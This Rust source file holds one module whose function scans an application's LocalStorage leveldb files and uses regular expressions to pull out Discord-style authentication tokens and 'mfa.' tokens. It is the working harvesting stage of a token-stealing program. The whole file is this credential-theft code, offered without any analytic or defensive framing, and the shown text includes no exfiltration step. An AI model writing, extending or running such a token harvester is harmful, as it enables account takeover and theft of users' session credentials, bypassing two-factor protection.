pub mod finder {
    use regex::Regex;
    use std::fs::{metadata, read_dir, File};
    use std::io::{self, BufRead, BufReader};
    use std::path::Path;

    fn get_extension(filename: &str) -> Option<&str> {
        Path::new(filename).extension().and_then(|ext| ext.to_str())
    }

    pub fn find_tokens(p: &String) -> Result<Vec<String>, std::io::Error> {
        let path = format!("{}\\LocalStorage\\leveldb", p);
        
        if !Path::new(&path).exists() {
            return Ok(Vec::new());
        }

        let r = read_dir(path)?;
        let mut tokens: Vec<String> = Vec::new();
        let token_regex = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap();
        let mfa_regex = Regex::new(r"mfa\.[\w-]{84}").unwrap();
        
        for entry in r {
            let entry = entry?;
            let path_buf = entry.path();
            let path_str = path_buf.to_string_lossy();
            
            // Check if it's a file
            if let Ok(metadata) = metadata(&path_buf) {
                if metadata.is_file() {
                    // Check extension
                    if let Some(extension) = get_extension(&path_str) {
                        if extension != "ldb" && extension != "log" {
                            continue;
                        }
                    } else {
                        continue;
                    }
                    
                    if let Ok(file) = File::open(&path_buf) {
                        let reader = BufReader::new(file);
                        
                        for line in reader.lines() {
                            if let Ok(line_content) = line {
                                for caps in token_regex.captures_iter(&line_content) {
                                    if let Some(matched) = caps.get(0) {
                                        tokens.push(matched.as_str().to_string());
                                    }
                                }
                                
                                for caps in mfa_regex.captures_iter(&line_content) {
                                    if let Some(matched) = caps.get(0) {
                                        tokens.push(matched.as_str().to_string());
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        Ok(tokens)
    }
}
